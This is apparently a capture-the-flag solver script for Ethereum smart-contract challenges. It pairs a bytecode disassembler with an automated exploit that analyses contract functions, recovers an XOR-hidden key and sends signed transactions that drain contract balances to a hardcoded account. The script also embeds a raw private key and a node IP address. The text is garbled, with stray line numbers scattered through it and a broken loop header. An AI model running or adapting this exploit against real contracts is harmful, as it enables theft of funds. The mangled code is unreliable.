        return result
def disassemble(bytecode: bytes) -> list:
    instruction_list = []
    address = 0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
    length = len(bytecode)
    if "bzzr" in str(bytecode[-43:]):
        # ignore swarm hash
        length -= 43
    while address  bool:
    for index, pattern_slot in enumerate(pattern, start=index):
        try:
            if not instruction_list[index]["opcode"] in pattern_slot:
                return False
        except IndexError:
            return False
    return True
def find_op_code_sequence(pattern: list, instruction_list: list):
    for i in range(0, len(instruction_list) - len(pattern) + 1):
        if is_sequence_match(pattern, instruction_list, i):
            yield i
def find_ins(op,arg,ins_list):
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
    for idx,ins in enumerate(ins_list):
        if ins['opcode'] == op and ins['argument'][2:] == arg:
            return idx
    return 0
def get_functions(ins_list):
    jump_table_indices = find_op_code_sequence(
        [("PUSH4"), ("EQ")], ins_list
    )
    return jump_table_indices
def find_op_code_by_addr(ins_list,address):
    for idx,ins in enumerate(ins_list):
        addr = ins["address"]
        if addr == address:
            return idx
def find_ins_target(function_dest,ins_list):
    for idx, ins in enumerate(ins_list):
        addr = ins["address"]
        if addr == function_dest:
            return idx
# # # with key
# bytecode = 
"60806040526f89a245c5aca9dcc00a66852a25b299a160005561013480610027600039600
0f300608060405260043610610041576000357c01000000000000000000000000000000000
00000000000000000000000900463ffffffff168063d254090214610046575b600080fd5b3
4801561005257600080fd5b50610091600480360381019080803573fffffffffffffffffff
fffffffffffffffffffff16906020019092919080359060200190929190505050610093565
b005b6384e5f57463cafebaba82181415610104578173fffffffffffffffffffffffffffff
fffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150
290604051600060405180830381858888f19350505050158015610102573d6000803e3d600
0fd5b505b50505600a165627a7a7230582013f1d0b8541db7c398e1649b6f15d2dec5985fe
6bfbad651648421916c1e70be0029"
# # # not know payable
# # bytecode = 
"608060405260e0806100126000396000f300608060405260043610603f576000357c01000
00000000000000000000000000000000000000000000000000000900463ffffffff1680633
2d30797146044575b600080fd5b604a604c565b005b600134111560b2573373fffffffffff
fffffffffffffffffffffffffffff166108fc3073fffffffffffffffffffffffffffffffff
fffffff16319081150290604051600060405180830381858888f1935050505015801560b05
73d6000803e3d6000fd5b505b5600a165627a7a72305820499181223b706020d06813fab3b
6868993170791ed3d4f418895756681542eda0029"
#
# ins_list = disassemble(bytes.fromhex(bytecode))
# print(ins_list)
# jump_tables = get_functions(ins_list)
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
Solver:
# print(list(jump_tables))
# functions = []
# tags = []
# runtime = re.split('60806040',bytecode)
# runtime = '60806040'+runtime[-1]
# for a in jump_tables:
#     functions.append("0x" + ins_list[a]["argument"][2:].rjust(8, "0")) # 
function sig
#     function_dest = int(ins_list[a + 2]['argument'][2:], 16)
#
# jump_table_indices = find_ins('PUSH4', 'cafebaba', ins_list)
# print(ins_list[jump_table_indices-1])
102
103
104
105
106
107
108
109
110
111
112
import re
import web3
from web3 import Web3
from pwn import *
from exp2 import getsha256
from get_functions import disassemble, get_functions
w3 = Web3(Web3.HTTPProvider('http://8.140.174.230:8545'))
my_account = web3.Web3.toChecksumAddress(
    '0x80c6CA0F2066e0DB7dA39d40eDC01885C08548F5')
private_key = 
'0xa2e67b010e77dda45b43617db5a7bf3d390b6a21f80d3145ce5c5d4fb97ab308'
mytx_account = w3.eth.account.from_key(private_key)
context.log_level = 'debug'
class Block:
    def __init__(self, ins):
        self.ins = ins
        self.ins_list = []
        for i in ins:
            self.ins_list.append(i['opcode'])
def build_tx(sig, con_address, datas=[], msg_value=0, offset_nonce=0):
    tx = {
        'from': my_account,
        'to': con_address,
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
        'value': msg_value,
        'gas': 210000,
        'nonce': w3.eth.getTransactionCount(my_account)+offset_nonce,
        'gasPrice': 10,
        'chainId': 8888,
        'data': bytes.fromhex(sig[2:])
    }
    for d in datas:
        tx['data'] += bytes.fromhex(d).rjust(32, b"\x00")
    return tx
def send(tx):
    r_tx = mytx_account.sign_transaction(tx)
    f_tx = r_tx.rawTransaction
    ret1 = w3.eth.send_raw_transaction(f_tx)
    _ = w3.eth.wait_for_transaction_receipt(ret1)
    return ret1
def find_addr(inss):
    for ins in inss:
        if 'argument' in ins.keys() and 
'0xffffffffffffffffffffffffffffffffffffffff' == ins['argument']:
            return True
    return False
def anaylse_function(function, blocks):
    (sig1, calling1), = function.items()
    next_block = blocks[calling1]
    if "CALLVALUE" in next_block.ins_list:
        payable = False
        next_block = blocks[int(next_block.ins[-2]['argument'], 16)]
        args = next_block.ins_list.count("CALLDATALOAD")
        addr_arg = find_addr(next_block.ins)
    else:
        payable = True
        addr_arg = False
        args = 0
    return payable, args, addr_arg
def divide_blocks(ins_list):
    blocks = {}
    old_idx = 0
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
    for idx in range(0, len(ins_list)):
        if ins_list[idx]['opcode'] in ['STOP', 'JUMP', 'JUMPI', 'RETURN', 
'REVERT', 'INVALID']:
            tmp = Block(ins_list[old_idx:idx + 1])
            blocks[ins_list[old_idx]['address']] = tmp
            old_idx = idx + 1
        idx += 1
    return blocks
def get_analyzed(functions, blocks):
    func_list = []
    for func in functions:
        (sig, calling), = func.items()
        payable, args, addr_arg = anaylse_function(func, blocks)
        func_list.append({sig: [payable, args, addr_arg]})
    return func_list
def deep_in_block(block, runtime, blocks):
    dura = runtime[block.ins[0]['address']*2:block.ins[-1]['address']*2]
    if "60038190" in dura:
        return True
    elif block.ins[-1]['opcode'] in ['STOP', 'RETURN', 'REVERT', 
'INVALID']:
        return
    try:
        next_block = blocks[int(block.ins[-2]['argument'], 16)]
        ret = deep_in_block(next_block, runtime, blocks)
        return ret
    except:
        return
def gen_functions(bytecode, con_address):
    runtime = re.split('60806040', bytecode)
    runtime = '60806040' + runtime[-1]
    ins_list = disassemble(bytes.fromhex(runtime))
    jump_tables = get_functions(ins_list)
    blocks = divide_blocks(ins_list)
    functions = []
    for a in jump_tables:
        functions.append(
            {"0x" + ins_list[a]["argument"][2:].rjust(8, "0"): 
int(ins_list[a + 2]["argument"][2:], 16)})
    owner = "0x8da5cb5b"
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
    for func in functions:
        (sig, calling), = func.items()
        if owner == sig:
            functions.remove(func)
            break
    print(functions)
    func_list = get_analyzed(functions, blocks)
    if len(func_list) == 1:
        (sig, features), = func_list[0].items()
        # payablue payable, args, addr_arg
        if features[0]:
            tx = build_tx(sig, con_address, datas=[], msg_value=30)
            rec = send(tx)
            return rec
        elif "cafeba" in runtime:
            pika = runtime.split("cafeba")[0][-10:-2]
            key = "cafeba"+runtime.split("cafeba")[1][:2]
            # print("get_key",pika,key)
            in_key = int(key, 16) ^ int(pika, 16)
            tx = build_tx(sig, con_address, datas=[
                          my_account[2:], hex(in_key)[2:].rjust(8, '0')])
            rec = send(tx)
            return rec
        else:
            tx = build_tx(sig, con_address, datas=[my_account[2:]])
            rec = send(tx)
            return rec
    if len(func_list) == 6:
        txs = [None] * 3
        for func in functions:
            (sig, pos), = func.items()
            ret = deep_in_block(blocks[pos], runtime, blocks)
            if ret:
                (sig4, _), = func.items()
                print("find", func)
                break
        for func in func_list:
            (sig, feature), = func.items()
            if feature[1] == 0:
                txs[2] = build_tx(sig, con_address, datas=[], 
offset_nonce=2)
            elif feature[2]:  # isaddr
                txs[1] = build_tx(sig, con_address, datas=[
                                  my_account[2:]], offset_nonce=1)
        txs[0] = build_tx(sig4, con_address, datas=['029a'])
118
119
120
121
122
123
124
125